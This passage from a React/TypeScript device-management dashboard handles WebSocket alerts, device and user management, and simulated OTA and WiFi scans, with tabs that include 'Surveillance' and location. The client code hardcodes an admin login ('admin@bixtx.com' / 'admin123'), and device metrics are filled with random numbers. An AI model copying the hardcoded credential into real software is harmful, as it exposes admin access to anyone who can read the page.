            const { deviceId } = payload as { deviceId: string };
            setDevices(prev => prev.map(d => d.id === deviceId ? { ...d, status: "online", lastSeen: new Date().toLocaleTimeString() } : d));
          } else if (type === "DEPLOY_JOB_ACK") {
            const { jobId, status, progress } = payload as { jobId: string; status: string; progress?: number };
            setDeployJobs(prev => prev.map(j => j.id === jobId
              ? { ...j, status: (status as DeployStatus) || j.status, progress: progress ?? j.progress, log: [...j.log, `[${new Date().toLocaleTimeString()}] ${status}${progress != null ? ` (${progress}%)` : ""}`] }
              : j));
          } else if (type === "EMERGENCY_ALERT" || type === "DANGER_ALERT") {
            const p = payload as { title?: string; detail?: string; alertType?: string };
            show(`🚨 ${p.title || p.alertType || type} — ${p.detail || "See alerts tab"}`, "error");
          } else if (type === "ANALYSIS_ALERT") {
            const p = payload as { finding?: { summary?: string } };
            show(`🔬 Anti-analysis event: ${p.finding?.summary || "Check SIEM"}`, "info");
          } else if (type === "MDM_POLICY_ACK") {
            const p = payload as { policyName?: string; enforced?: boolean; deviceId?: string };
            show(`MDM ACK from ${p.deviceId || "agent"}: "${p.policyName}" ${p.enforced ? "enforced" : "relaxed"}`, "success");
          }
        } catch {}
      };

      ws.onclose = () => {
        if (!destroyed) reconnectTimer = setTimeout(() => connect(token), 8000);
      };
      ws.onerror = () => { ws?.close(); };
    };

    fetch(`${API_BASE}/auth/token`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: "admin@bixtx.com", password: "admin123" }),
    })
      .then(r => r.ok ? r.json() : null)
      .then(data => { if (data?.token) connect(data.token); })
      .catch(() => {});

    return () => {
      destroyed = true;
      if (reconnectTimer) clearTimeout(reconnectTimer);
      ws?.close();
    };
  }, []);

  const online    = devices.filter(d => d.status==="online").length;
  const warning   = devices.filter(d => d.status==="warning").length;
  const offline   = devices.filter(d => d.status==="offline").length;
  const activeSess= sessions.filter(s => s.status==="active").length;
  const activeAlerts = alerts.filter(a => !a.dismissed);

  const extractCountry = (location: string) => {
    const parts = location.split(",");
    return parts.length > 1 ? parts[parts.length - 1].trim() : location.trim();
  };
  const allCountries = Array.from(new Set(devices.map(d => extractCountry(d.location)))).sort();

  const filtered = devices.filter(d => {
    const q = search.toLowerCase();
    const country = extractCountry(d.location);
    return (fStatus==="all"  || d.status===fStatus)
        && (fType==="all"    || d.type===fType)
        && (fCountry==="all" || country===fCountry)
        && (!q || d.name.toLowerCase().includes(q)
               || d.user.toLowerCase().includes(q)
               || d.ip.includes(q)
               || d.location.toLowerCase().includes(q));
  });

  const genCode = () => {
    const c = Math.random().toString(36).slice(2,10).toUpperCase();
    setCode(c); return c;
  };

  const openAdd = () => { genCode(); setAName(""); setAUser(""); setAIP(""); setATab("code"); setShowAdd(true); };

  const openManage = (d: DashDevice) => {
    setManageDev(d); setMName(d.name); setMStatus(d.status); setMIP(d.ip); setMHealth(d.health);
    setShowManage(true);
  };

  const handleAddDevice = () => {
    if (!aName || !aUser) { show("Fill device name and owner", "error"); return; }
    const nd: DashDevice = {
      id: `d${Date.now()}`, name:aName, os:aOS,
      ip: aTab==="ip" && aIP ? aIP : "0.0.0.0",
      user:aUser,
      status: aTab==="ip" && aIP ? "online" : "offline",
      cpu:   aTab==="ip" ? Math.floor(Math.random()*50)+10 : 0,
      ram:   aTab==="ip" ? Math.floor(Math.random()*50)+20 : 0,
      latency: aTab==="ip" ? Math.floor(Math.random()*10)+3 : 0,
      uptime: aTab==="ip" ? "0d 0h" : "—",
      location:"Unknown", lastSeen: aTab==="ip" ? "Now" : "Never",
      performance: aTab==="ip" ? Math.floor(Math.random()*20)+78 : 0,
      health:"good", type:aType, battery:undefined,
    };
    setDevices(p => [...p, nd]);
    show(`Device "${aName}" ${aTab==="ip"?"connected":"enrolled — install agent to activate"}`);
    setShowAdd(false);
  };

  const handleSaveManage = () => {
    if (!manageDev) return;
    setDevices(p => p.map(d => d.id===manageDev.id ? {...d, name:mName, status:mStatus, ip:mIP, health:mHealth} : d));
    show(`"${mName}" updated`); setShowManage(false);
  };

  const handleRemoveDev = () => {
    if (!manageDev) return;
    setDevices(p => p.filter(d => d.id!==manageDev.id));
    show(`Device removed`, "info"); setShowManage(false);
  };

  const handleByIP = () => {
    if (!bName || !bIP) { show("Enter device name and IP", "error"); return; }
    const nd: DashDevice = {
      id:`d${Date.now()}`, name:bName, os:"windows", ip:bIP,
      user:bUser||"unknown", status:"online",
      cpu:Math.floor(Math.random()*50)+10, ram:Math.floor(Math.random()*50)+20,
      latency:Math.floor(Math.random()*10)+3, uptime:"0d 0h",
      location:"Unknown", lastSeen:"Now",
      performance:Math.floor(Math.random()*20)+78,
      health:"good", type:"desktop", battery:undefined,
    };
    setDevices(p => [...p, nd]);
    show(`Connected to ${bIP}`); setShowByIP(false);
    setBName(""); setBIP(""); setBPort("4433"); setBUser(""); setBPass("");
  };

  const handleAddUser = () => {
    if (!uName || !uEmail) { show("Enter name and email", "error"); return; }
    setUsers(p => [...p, { id:`u${Date.now()}`, name:uName, email:uEmail, role:uRole, status:"active", lastLogin:"Never", devices:0 }]);
    show(`User "${uName}" added`); setShowAddUser(false); setUName(""); setUEmail(""); setURole("viewer");
  };

  const handleEndSession   = (id: string) => { setSessions(p => p.filter(s => s.id!==id)); show("Session ended","info"); };
  const handleToggleSess   = (id: string) => {
    setSessions(p => p.map(s => s.id===id ? {...s, status: s.status==="active"?"paused":"active"} : s));
    show("Session updated");
  };
  const handleToggleUser   = (id: string) => {
    setUsers(p => p.map(u => u.id===id ? {...u, status: u.status==="active"?"inactive":"active"} : u));
    show("User status updated");
  };
  const handleRemoveUser   = (id: string) => {
    const u = users.find(x => x.id===id);
    setUsers(p => p.filter(x => x.id!==id));
    show(`"${u?.name}" removed`, "info");
  };
  const handleCopy = () => {
    copyToClip(code, () => {
      setCopied(true); show("Code copied"); setTimeout(() => setCopied(false), 2000);
    });
  };
  const dismissAlert = (id: number) => setAlerts(p => p.map(a => a.id===id ? {...a, dismissed:true} : a));
  const dismissAll   = () => { setAlerts(p => p.map(a => ({...a, dismissed:true}))); show("All alerts cleared","info"); };

  const handleOTA = () => {
    if (otaPct !== null) return;
    setOtaPct(0);
    const iv = setInterval(() => {
      setOtaPct(p => {
        if (p===null || p>=100) { clearInterval(iv); show(`OTA pushed to ${online} devices`); setOtaPct(null); return null; }
        return Math.min(p + 10, 100);
      });
    }, 180);
  };

  const handleScan = () => {
    if (scanning) return;
    setScanning(true); setScanPct(0); setScanned(false);
    const iv = setInterval(() => {
      setScanPct(p => {
        if (p >= 100) { clearInterval(iv); setScanning(false); setScanned(true); show("WiFi scan complete"); return 100; }
        return p + 5;
      });
    }, 80);
  };

  const TABS = [
    { id:"devices",      label:"My Devices",    badge: filtered.length },
    { id:"sessions",     label:"Sessions",       badge: activeSess      },
    { id:"network",      label:"Network",        badge: null            },
    { id:"surveillance", label:"Surveillance",   badge: null            },
    { id:"location",    
